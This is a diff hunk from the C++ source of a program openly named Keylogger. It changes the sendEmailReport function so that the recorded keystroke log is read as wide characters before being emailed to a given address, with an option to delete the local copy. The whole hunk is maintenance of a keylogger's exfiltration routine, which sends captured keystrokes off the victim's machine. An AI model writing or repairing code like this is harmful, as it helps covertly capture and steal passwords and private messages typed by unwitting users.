@@ -126,10 +126,10 @@ bool Keylogger::sendEmailReport(std::wstring emailTo, bool deleteLocal) {
 
 	// Create email body
 	logFile.close();
-	std::ifstream logData;
+	std::wifstream logData;
 	logData.open(this->FILENAME, std::ios::in);
-	std::wstring body((std::istreambuf_iterator<char>(logData)),
-		std::istreambuf_iterator<char>());
+	std::wstring body((std::istreambuf_iterator<wchar_t>(logData)),
+		std::istreambuf_iterator<wchar_t>());
 	logData.close();
 
 	bool sendEmailResult = emailService->sendEmail(subject.str(), body, emailTo);
